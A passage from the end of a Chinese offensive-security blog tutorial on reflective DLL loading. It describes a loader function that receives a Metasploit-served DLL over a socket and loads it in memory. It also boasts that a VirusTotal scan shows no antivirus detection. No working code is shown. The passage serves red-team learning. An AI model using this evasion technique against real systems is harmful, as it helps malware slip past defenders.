t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>
+</span></span></code></pre></div><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p><p>实现效果如下：</p><p><img src=https://images.payloads.online/82f319d8-4f5f-11ec-a688-00d861bf4abb.png alt=2020-01-03-13-07-19></p><h2 id=0x04-总结>0x04 总结</h2><p>注意：学习的过程中，不同位数要对应不同的payload，编译平台也要互相对应</p><p>第六课就到这里了，主要是引入反射DLL加载这个技术，以及如何使用这个技术，如果想深入研究，还需要学习Windows PE相关的基础知识。</p><p>老样子，V站查杀一下：</p><p><img src=https://images.payloads.online/832a3850-4f5f-11ec-86bb-00d861bf4abb.png alt=2020-01-03-13-07-29></p><p>挑战了全球的AV，全部通过</p><p><a href=https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection>https://www.virustotal.com/gui/file/f27a16434684986206921c63a3d5d71e5ede3f95a6175fd9572a5b5029adc28c/detection</a></p><p>所有的新技术，都离不开强大的基础知识的铺垫，通过积攒基础知识，使自己能挑战更多的"不可能"。</p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2020-01-25/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>2019年度总结随想</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2020-01-01/1/><span>Linux权限维持之LD_PRELOAD</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>
